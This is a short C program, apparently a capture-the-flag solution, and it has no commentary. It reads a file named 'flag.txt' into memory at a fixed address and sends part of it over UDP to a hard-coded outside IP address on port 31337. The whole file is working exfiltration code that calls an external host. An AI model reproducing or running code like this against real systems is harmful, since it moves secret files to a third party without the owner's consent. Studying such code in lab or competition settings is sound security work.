#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/mman.h>

int main(void){
    int socket_desc;
    struct sockaddr_in server_addr;
    int server_struct_length = sizeof(server_addr);

    int fd = open("flag.txt", O_RDONLY);
    int *flag = mmap(0x12340000, 86, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);


    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(31337);
    server_addr.sin_addr.s_addr = inet_addr("167.235.159.58");
    
    // Create socket:
    socket_desc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    // Set port and IP:
    

    // Send the message to server:
    sendto(socket_desc, 0x12340000, 50, 0, (struct sockaddr*)&server_addr, server_struct_length);
    // Close the socket:
    close(socket_desc);

    return 0;
}